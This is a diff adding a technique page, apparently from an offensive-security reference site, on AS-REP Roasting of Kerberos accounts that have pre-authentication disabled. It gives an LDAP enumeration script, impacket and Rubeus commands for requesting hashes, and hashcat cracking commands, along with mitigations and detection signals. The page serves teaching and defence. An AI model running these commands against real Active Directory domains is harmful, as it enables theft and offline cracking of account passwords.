@@ -1,0 +1,189 @@
+---
+title: AS-REP Roasting
+mitre: T1558.004
+category: credential-access
+group: Kerberos Attacks
+summary: Request AS-REP messages for accounts with pre-authentication disabled and crack the encrypted timestamp offline.
+platform: [Windows]
+tags: ['Python', 'PowerShell', 'Kerberos', 'Active Directory']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 6 min read
+callChain:
+  - call: enumerate accounts without pre-auth (DONT_REQUIRE_PREAUTH)
+    desc: LDAP query for userAccountControl bit 0x400000 set — these accounts respond to AS-REQ without verifying a timestamp.
+    dll: —
+  - call: send unauthenticated AS-REQ to KDC (TCP/UDP 88)
+    desc: No valid credentials required — the KDC responds with an AS-REP regardless.
+    dll: —
+  - call: extract encrypted blob from AS-REP
+    desc: The AS-REP PA-ENC-TIMESTAMP is encrypted with the account's RC4 key (NTLM hash) or AES key.
+    dll: —
+  - call: crack offline with hashcat
+    desc: Mode 18200 targets the Kerberos 5 AS-REP etype 23 (RC4-HMAC) format.
+    dll: —
+detections:
+  - src: WINDOWS EID 4768
+    text: AS-REQ for an account with pre-authentication disabled, especially in a burst from one source IP.
+  - src: NETWORK
+    text: Unauthenticated AS-REQ packets to port 88 — no preceding LDAP bind or NTLM exchange from that source.
+  - src: LDAP LOG
+    text: LDAP query for (userAccountControl:1.2.840.113556.1.4.803:=4194304) from a non-admin account.
+  - src: BEHAVIOURAL
+    text: A single source IP sending AS-REQs for multiple different usernames in rapid succession.
+related:
+  - mitre: T1558.003
+    title: Kerberoasting
+    desc: Request service tickets for SPNs and crack offline — requires valid domain credentials.
+    href: /techniques/credential-access/kerberoasting
+  - mitre: T1110.002
+    title: Password Cracking
+    desc: The AS-REP hash is cracked the same way as a Kerberoast hash.
+  - mitre: T1003.006
+    title: DCSync
+    desc: Once cracked, use the account's credentials to escalate toward DCSync.
+    href: /techniques/credential-access/dcsync
+labKit:
+  - label: impacket GetNPUsers.py
+    href: 'https://github.com/fortra/impacket'
+  - label: Rubeus asreproast
+    href: 'https://github.com/GhostPack/Rubeus'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Kerberos pre-authentication requires a client to prove it knows the account password *before* the KDC issues a Ticket Granting Ticket: it encrypts the current timestamp with the account's long-term key and sends it in the `PA-ENC-TIMESTAMP` field of the AS-REQ. The KDC decrypts it, verifies the timestamp is recent, and only then issues a TGT.
+
+The `DONT_REQUIRE_PREAUTH` user account control flag disables this check. The KDC responds to any AS-REQ for that account — even an unauthenticated one — with an AS-REP that contains a blob encrypted with the account's key. An attacker can request that blob without presenting any credentials, then crack it offline.
+
+Unlike Kerberoasting, AS-REP roasting requires **no valid domain credentials** to enumerate or request hashes. A network foothold or internal network access is sufficient.
+
+<Callout type="note">
+  The `DONT_REQUIRE_PREAUTH` flag exists for legacy compatibility with older Kerberos clients
+  (MIT Kerberos, some Unix services). It should never appear on user accounts in a hardened domain.
+  Any account with this flag set in an Active Directory environment is either misconfigured or
+  intentionally backdoored.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Enumerate vulnerable accounts (LDAP, no credentials)
+
+<CodeBlock
+  file="enum_asrep.py"
+  label="Python"
+  lang="python"
+  class="mb-7.5"
+  code={`from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
+
+server = Server('10.10.10.1', get_info=ALL)
+
+# Anonymous or authenticated LDAP bind
+conn = Connection(server, user='CORP\\\\low_priv', password='Password1!', auto_bind=True)
+
+# bit 0x400000 (4194304) = DONT_REQUIRE_PREAUTH
+conn.search(
+    'DC=corp,DC=local',
+    '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
+    attributes=['sAMAccountName', 'userAccountControl', 'memberOf']
+)
+
+for entry in conn.entries:
+    print(f"[!] {entry.sAMAccountName}  ->  {entry.memberOf}")`}
+/>
+
+### Request AS-REP hashes (impacket)
+
+<CodeBlock
+  file="asrep_impacket.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# No credentials needed — will roast any account with preauth disabled
+$ python3 GetNPUsers.py corp.local/ -dc-ip 10.10.10.1 -no-pass -usersfile users.txt
+
+# Authenticated enumeration — finds all vulnerable accounts automatically
+$ python3 GetNPUsers.py corp.local/low_priv:Password1! -dc-ip 10.10.10.1 -request
+
+# Output (hashcat 18200 format)
+$krb5asrep$23$svc_backup@CORP.LOCAL:3c6d9f0a...8fae1b2c$9a3f...:3e2d...
+
+# Save directly to a file for cracking
+$ python3 GetNPUsers.py corp.local/ -dc-ip 10.10.10.1 -no-pass \
+    -usersfile users.txt -outputfile asrep_hashes.txt`}
+/>
+
+### Rubeus (Windows, in-memory)
+
+<CodeBlock
+  file="asrep_rubeus.ps1"
+  label="PowerShell"
+  lang="powershell"
+  class="mb-7.5"
+  code={`# Enumerate and roast all vulnerable accounts in one command
+.\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt
+
+# Target a specific user
+.\Rubeus.exe asreproast /user:svc_backup /format:hashcat
+
+# Request AES256 (etype 18) — harder to crack but shows AES key exposure
+.\Rubeus.exe asreproast /user:svc_backup /etype:aes256`}
+/>
+
+### Crack with hashcat
+
+<CodeBlock
+  file="crack_asrep.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Mode 18200 = Kerberos 5 AS-REP etype 23 (RC4-HMAC)
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# With rules for better coverage
+hashcat -m 18200 asrep_hashes.txt rockyou.txt -r best64.rule
+
+# AES256 (etype 18) is mode 19900 — significantly slower
+hashcat -m 19900 asrep_aes_hashes.txt rockyou.txt`}
+/>
+
+## RC4 vs AES cracking performance
+
+| Etype | Hashcat mode | Speed (RTX 3090) | Notes |
+|---|---|---|---|
+| RC4-HMAC (23) | 18200 | ~800 MH/s | Default; fast to crack |
+| AES128 (17) | 19800 | ~3 MH/s | Rarely seen |
+| AES256 (18) | 19900 | ~1.5 MH/s | Modern DCs prefer this |
+
+Pre-auth bypass returns RC4 by default even on AES-only domains unless the client explicitly requests AES. Always check what etype the DC issues — some hardened environments disable RC4 globally.
+
+## Mitigations
+
+| Control | Effectiveness |
+|---|---|
+| Audit for `DONT_REQUIRE_PREAUTH` flag (weekly) | Detects misconfiguration |
+| Protected Users security group | Forces AES and disables legacy Kerberos options |
+| Fine-grained password policy with 25+ char passwords | Cracking infeasible even for RC4 hashes |
+| Require pre-auth in Kerberos policy | Direct prevention |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+EID 4768 with `Pre-Authentication Type: 0x0` (no pre-auth) is the cleanest signal. In a hardened domain, this event should never appear — any occurrence warrants immediate investigation. Correlate the source IP against legitimate workstations and service accounts.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
